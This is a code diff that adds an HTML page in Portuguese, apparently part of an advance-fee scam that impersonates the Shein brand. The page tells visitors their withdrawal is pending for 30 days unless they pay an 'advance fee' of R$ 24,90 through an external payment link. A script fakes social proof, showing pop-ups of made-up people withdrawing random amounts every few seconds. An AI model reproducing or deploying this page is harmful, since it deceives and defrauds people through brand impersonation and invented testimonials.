@@ -1,0 +1,235 @@
+<!DOCTYPE html><html lang="pt-BR"><head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link data-optimized="1" rel="stylesheet" href="css/5921624bf5bbe4c8c091ef09226fa76f.css">
+    <link rel="preconnect" href="https://fonts.googleapis.com/">
+    <link rel="preconnect" href="https://fonts.gstatic.com/" crossorigin="">
+    <link data-optimized="1" href="css/1c7a3d2ee9759dc256d915300855c494.css" rel="stylesheet">
+    <link data-optimized="1" href="css/ba9cbbe9240a489628be8eb27c56db8a.css" rel="stylesheet">
+    <link rel="stylesheet" href="css/style.css">
+    <link rel="stylesheet" href="css/slider.css">
+    <link rel="stylesheet" href="css/animated.css">
+    <link rel="shortcut icon" href="images/faveicon.png">
+    <link rel="stylesheet" href="css/notiflix-3.2.5.min.css">
+    <title>Shein</title>
+
+    <style>
+        /* Estilo da barra de progresso */
+        .progress-container {
+            width: 100%;
+            background-color: #f3f3f3;
+            overflow: hidden;
+            margin-bottom: 10px;
+            margin-top: -10px;
+        }
+
+        .progress-bar {
+            width: 0%;
+            height: 30px;
+            background-color: #9a03d7;
+            text-align: center;
+            line-height: 30px;
+            color: black;
+            transition: width 1s ease-in-out;
+        }
+
+        .boxSaldo {
+            width: auto;
+            height: 40px;
+            border: 2px solid #9a03d7; /* Orange */
+            margin-right: 0px;
+            margin-top: 7px;
+            border-radius: 6px;
+            padding: 0 20px 0 10px;
+            position: relative;
+            float: right;
+            display: flex;
+            align-items: center;
+        }
+
+        .valorSaldo {
+            font-family: 'Poppins', sans-serif;
+            font-weight: 800; /* Peso maior para o valor */
+            font-size: 20px;
+            color: #333;
+        }
+
+        /* Estilo do botão */
+        button {
+            margin-bottom: 15px;
+            background-color: #9a03d7;
+            color: black;
+            border: none;
+            border-radius: 5px;
+            width: 95%;
+            height: 60px;
+            cursor: pointer;
+            box-shadow: 0 2px 15px rgba(0, 0, 0, 0.3);
+        }
+
+        /* Estilo geral dos textos */
+        body, p, label {
+            font-family: 'Poppins', sans-serif;
+            font-weight: 600;
+            color: #333;
+        }
+
+        h1 {
+            font-family: 'Poppins', sans-serif;
+            font-weight: 700;
+            color: #333;
+        }
+    </style>
+</head>
+<body class="fundoWhite">
+
+    <!-- NOTIFICAÇÃO -->
+  <style>
+    .notification-container {
+      position: fixed;
+      top: 10px;
+      left: 10px;
+      z-index: 1000;
+      display: flex;
+      flex-direction: column;
+      gap: 10px;
+    }
+
+    .notification {
+      background-color: #333;
+      color: #fff;
+      padding: 10px 15px;
+      border-radius: 5px;
+      box-shadow: 0 2px 4px rgba(0, 0, 0, 0.2);
+      opacity: 0;
+      transform: translateY(-20px);
+      animation: slide-in 0.5s forwards, fade-out 0.5s ease-in 4.5s forwards;
+    }
+
+    @keyframes slide-in {
+      to {
+        opacity: 1;
+        transform: translateY(0);
+      }
+    }
+
+    @keyframes fade-out {
+      to {
+        opacity: 0;
+        transform: translateY(-20px);
+      }
+    }
+  </style>
+
+  <div class="notification-container" id="notificationContainer"></div>
+
+  <script>
+    const names = [
+      "Lucas Silva", "Ana Costa", "João Oliveira", "Mariana Souza",
+      "Felipe Pereira", "Clara Mendes", "Carlos Eduardo", "Julia Rocha",
+      "Mateus Almeida", "Beatriz Lima", "Gabriel Santos", "Maria Eduarda",
+      "Rafael Barbosa", "Larissa Fernandes", "Pedro Henrique", "Isabela Nunes",
+      "Guilherme Ribeiro", "Fernanda Carvalho", "Thiago Almeida", "Camila Borges",
+      "Bruno Machado", "Amanda Ferreira", "Vinícius Martins", "Juliana Ribeiro",
+      "Leonardo Gonçalves", "Paula Castro", "Renan Vieira", "Sabrina Cardoso",
+      "Rodrigo Teixeira", "Natália Moura", "André Monteiro", "Carolina Azevedo",
+      "Eduardo Lopes", "Tatiane Ramos", "Diego Santana", "Marcela Antunes",
+      "Ruan Rodrigues", "Vanessa Marques", "Caio Silva", "Luan Freitas",
+      "Danilo Oliveira", "Aline Dias", "Samuel Costa", "Sara Pereira",
+      "Victor Souza", "Nathalia Alves", "Alexandre Moreira", "Patrícia Lima",
+      "Marcos Vinícius", "Gabriela Campos", "Ricardo Cunha", "Emanuela Moraes"
+    ];
+
+
+    function getRandomName() {
+      return names[Math.floor(Math.random() * names.length)];
+    }
+
+    function getRandomValue() {
+      return (Math.random() * (600 - 50) + 50).toFixed(2);
+    }
+
+    function showNotification() {
+      const container = document.getElementById("notificationContainer");
+      const randomName = getRandomName();
+      const randomValue = getRandomValue();
+
+      const notification = document.createElement("div");
+      notification.classList.add("notification");
+      notification.innerHTML = `${randomName} acabou de realizar um saque de <b style="color: #ffc0bd;">R$ ${randomValue}</b>`;
+
+      container.appendChild(notification);
+
+      // Remove the notification after 5 seconds
+      setTimeout(() => {
+        container.removeChild(notification);
+      }, 5000);
+    }
+
+    function startNotifications() {
+      showNotification();
+      const interval = Math.random() * (20000 - 5000) + 5000; // Intervalo entre 5 e 20 segundos
+      setTimeout(startNotifications, interval);
+    }
+
+    // Inicia as notificações
+    startNotifications();
+  </script>
+
+  <!-- NOTIFICAÇÃO -->
+
+
+    <div id="p1" style="background-color: #FFFFFF; padding: 15px 0 0 0; border-bottom: 1px solid #202020; box-shadow: 0 2px 15px rgba(0, 0, 0, 0.3);">
+        <img style="width: 15%; margin: auto; margin-left: 50px; position: relative; margin-top: -5px;" src="images/shein-logo.png">
+
+    <div id="produto1" style="width: 100%;">
+        <div style="text-align: center; display: flex; padding: 10px; justify-content: center; align-items: center; flex-direction: column; align-content: center; flex-wrap: wrap; position: relative;">
+            <img style="width: 180px; margin-bottom: -20px;" src="images/artpoin-logo-pix1.png">
+
+            <p style="font-size: 16px;"><b><i>Saque solicitado com sucesso!</i></b><br></p>
+            <p style="font-size: 14px;">Seu saque será enviado em até <b>30 dias úteis</b> para a <u>Chave Pix Cadastrada.</u><br><br>
+                Caso deseje <strong>Antecipar</strong> seu saque e receber <u>imediatamente</u> o seu dinheiro pague a Taxa Antecipação de Saque por apenas R$ 24,90.
+            </p>
+
+            <button id="paymentButton">PAGAR TAXA ANTECIPAÇÃO DE SAQUE</button>
+
+            <p style="font-size: 12px; color: gray; margin-top: 30px;">
+                FeedFy Premium 2024<br>
+                Todos os direitos reservados.
+            </p>
+        </div>
+    </div>
+
+    <script src="js/notiflix-3.2.5.min.js"></script>
+
+
+    
+    
+    <script type="text/javascript">
+        // Função para atualizar a barra de progresso
+        function updateProgressBar() {
+            const progressBar = document.getElementById('myProgressBar');
+            let width = 0;
+            const interval = setInterval(() => {
+                if (width >= 95) {
+                    clearInterval(interval);
+                } else {
+                    width++;
+                    progressBar.style.width = width + '%';
+                    progressBar.textContent = width + '%';
+                }
+            }, 10); // Tempo de atualização em milissegundos (ajuste se necessário)
+        }
+
+        // Chama a função quando a página carregar
+        window.onload = updateProgressBar;
+
+        document.getElementById('paymentButton').addEventListener('click', function() {
+            window.location.href ='https://go.tribopay.com.br/hy4z0'; // Substitua 'pagina-destino.html' pela URL para a qual deseja redirecionar
+        });
+    </script>
+
+
+
+</div></body></html>
